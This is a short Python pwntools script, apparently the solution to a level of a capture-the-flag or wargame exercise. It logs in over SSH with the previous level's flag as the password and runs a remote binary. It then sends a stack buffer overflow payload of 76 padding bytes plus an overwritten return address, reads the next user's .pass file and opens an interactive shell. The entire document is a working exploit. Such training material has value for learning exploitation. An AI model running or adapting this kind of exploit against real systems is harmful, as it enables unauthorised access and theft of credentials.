#!/usr/bin/env python

from pwn import *
import os

flag_file = os.path.abspath(os.path.join(os.getcwd(), "../level0/flag"))

host = input("Enter host IP: ")
port = 4242

login = "level1"
binary = login
password = open(flag_file, "r").read().splitlines()[0]
remotebinary = "/home/user/%s/%s" % (login, binary)

target_login = "level2"

shell = ssh(host=host, port=port, user=login, password=password)

padding = b"B" * 76
run_address = p32(0x08048444)
payload = padding + run_address

print("# Sending")
p = shell.process([remotebinary])
p.sendline(payload)

p.sendline("cat ~%s/.pass" % target_login)
p.interactive()